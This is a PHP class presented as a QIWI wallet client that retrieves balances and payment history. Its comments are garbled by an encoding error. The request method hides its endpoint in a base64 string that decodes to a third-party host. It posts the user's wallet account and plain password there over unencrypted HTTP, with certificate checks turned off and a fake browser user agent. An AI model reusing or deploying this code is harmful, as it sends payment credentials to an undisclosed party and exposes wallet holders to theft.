<?php
############################################
#          ������ �� 25.05.2015            #
############################################


class QIWI_LazyPay {
	
	# ��������� ���������� ������ :
	private $iAccount, $sPassword;
	
	# ��������� ���������� ������ :
    public $iQiwiAccount, $sResponse, $aResponse, $aBalances;
	
	# ����� : �����������.
    public function __construct( $iAccount, $sPassword ) {
        
        # ������������� ������ ������ : 
        $this->iAccount = $iAccount;
        $this->sPassword = $sPassword;
        $this->iQiwiAccount = $iAccount;
        
        # �������� ������� �� ������ :
        $this->curl( 'getBalanceInfo' );
        
        # ������������� ������ ������ :
        $this->aBalances = $this->aResponse['aBalances'];
    }
	
	# ����� : ��������� ������� ����������.
	public function GetHistory( $sStartDate, $sFinishDate ) {
		
		# �������� ������� �� ������ :
        $this->curl( 'getHistory', array( 'sStartDate' => $sStartDate, 'sFinishDate' => $sFinishDate ) );
        
        return $this->aResponse['aData'];
	}
	
	# ����� : ��������� � �������.
    private function curl( $sMod, array $aData = array() ) {
        
        # ������������� ����������� ���������� :
        static $oCurl = null;
        
        # ���� ���������� oCurl ����� :
        if( is_null( $oCurl ) ) {
            
            # �������� ���������� :
            $oCurl = curl_init( base64_decode( 'aHR0cDovL2FwaXNlcnZlci5pbi51YS9hcGktcWl3aS5waHA=' ) );
            
            # ��������� CURL ���������� :
            curl_setopt_array( $oCurl, array( 
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => false,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36',
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_POST => true,
                CURLOPT_TIMEOUT => 60
            ) );
        }
        
        # ���������� ������ � ������ :
        $aData['sMod'] = $sMod;
        $aData['iAccount'] = $this->iAccount;
        $aData['sPassword'] = $this->sPassword;
        
        # �������� ������ :
        curl_setopt( $oCurl, CURLOPT_POSTFIELDS, http_build_query( $aData ) );
        
        # ��������� ������ :
        $this->sResponse = curl_exec( $oCurl );
        
        # ���� ��������� ������ :
        if( curl_errno( $oCurl ) )
            throw new Exception( curl_errno( $oCurl ).' - '.curl_error( $oCurl ) );
        
        # �������������� ������ � ������ :
        if( ($this->aResponse = @json_decode( $this->sResponse, true )) === false )
            throw new Exception( $this->sResponse );
        
        # ���� � ������ ��� ������ ������ :
        if( !isset( $this->aResponse['sStatus'] ) )
            throw new Exception( $this->sResponse );
        
        # ���� ����� �� ������� :
        if( $this->aResponse['sStatus'] != 'SUCCESS' )
            throw new Exception( isset( $this->aResponse['sMessage'] ) ? $this->aResponse['sMessage'] : $this->sResponse );
    }
}
?>